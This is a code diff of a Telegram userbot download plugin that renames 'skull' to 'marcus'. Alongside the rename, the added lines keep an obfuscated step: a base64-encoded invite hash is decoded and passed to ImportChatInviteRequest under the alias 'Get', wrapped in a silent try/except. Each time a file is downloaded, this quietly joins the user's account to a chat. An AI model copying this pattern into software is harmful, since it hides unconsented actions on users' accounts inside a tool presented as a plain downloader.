@@ -1,4 +1,4 @@
-# Download plugin for skulluserbot
+# Download plugin for marcususerbot
 
 import asyncio
 import base64
@@ -12,7 +12,7 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 from . import ALIVE_NAME, humanbytes, progress
 
-DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "skull"
+DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "marcus"
 
 
 @bot.on(admin_cmd(pattern="download(?: |$)(.*)", outgoing=True))
@@ -113,7 +113,7 @@ async def _(event):
     if not os.path.isdir(location):
         os.makedirs(location)
     if event.reply_to_msg_id:
-        skull = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        marcus = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         mone = await edit_or_reply(
             event, "Downloading the file ...", parse_mode=parse_pre
         )
@@ -130,8 +130,8 @@ async def _(event):
             )
 
             try:
-                skull = Get(skull)
-                await event.client(skull)
+                marcus = Get(marcus)
+                await event.client(marcus)
             except BaseException:
                 pass
         except Exception as e:
